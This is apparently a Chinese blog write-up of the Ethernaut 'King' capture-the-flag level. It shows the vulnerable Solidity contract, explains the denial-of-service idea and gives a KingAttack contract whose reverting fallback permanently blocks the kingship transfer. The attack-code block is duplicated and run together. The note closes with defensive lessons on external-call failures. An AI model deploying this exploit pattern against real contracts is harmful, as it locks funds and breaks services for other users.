---
title: Ethernaut 闯关笔记 第10关 King
date: 2023-12-13 02:14:42
tags:
---

# 原始代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

    address king;
    uint public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;  
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

# 攻击思路

乍一看没什么问题，不知道从何下手。

实际上，唯一的攻击面就是在 `payable(king).transfer(msg.value);` 这一行。

如果 `king` 是一个合约，那么这样的 `transfer` 就会调用合约的 `receive()` 函数，而 `receive()` 中可能包含恶意代码。

根据[0xSage 的这篇文章](https://medium.com/coinmonks/ethernaut-lvl-9-king-walkthrough-how-bad-contracts-can-abuse-withdrawals-db12754f359b)，向合约发送 ETH 的时候， `receive()` 中可能存在以下 3 个漏洞：

1. 被调用的合约没有 `payable` 的 `callback` 函数，不能接收 ETH ，这将会抛出一个错误；
2. 被调用的合约中 `fallback` 函数内存在恶意代码，故意终止合法的调用并抛出异常；
3. 被调用的合约中 `fallback` 函数内存在消耗大量 gas 的恶意代码，耗尽了调用者的 gas fee 后交易回滚。

综上，我们可以让一个合约成为 `king` ，并在这个合约的 `receive()` 函数中留下恶意代码，收到 `transfer` 的金额后直接回滚。

# 攻击代码

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}


contract KingAttack {

  	constructor(address payable contract_addr) payable {
      contract_addr.call{value:0.001 ether}("");
  	}
    fallback()payable external{
    	revert();
    }
}// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

contract King {

    address king;
    uint public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;  
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}


contract KingAttack {

  	constructor(address payable contract_addr) payable {
        contract_addr.call{value:0.001 ether}("");
  	}
    fallback() payable external{
    	revert();
    }
}
```

# 安全启示

1. `tranfer` 和 `send` 是自带 gas 上限的，如果超出上限会 revert； `call` 可以自行设置 gas 上限（不设置就是正无穷），如果超出上限会返回 `false` ，而不是 revert。
2. 设计合约时，永远不能假定外部调用一定会成功，务必做好调用失败的判断及处理。

